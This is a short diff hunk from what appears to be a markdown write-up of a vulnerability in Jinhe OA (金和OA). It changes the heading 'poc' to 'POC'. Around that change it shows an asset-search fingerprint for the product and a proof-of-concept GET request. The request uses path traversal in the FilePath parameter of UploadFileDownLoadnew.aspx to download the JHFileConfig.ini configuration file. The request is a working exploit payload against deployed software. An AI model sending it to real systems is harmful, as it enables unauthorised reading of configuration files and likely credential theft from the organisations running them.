@@ -8,7 +8,7 @@
 body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 
 ```
 GET /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
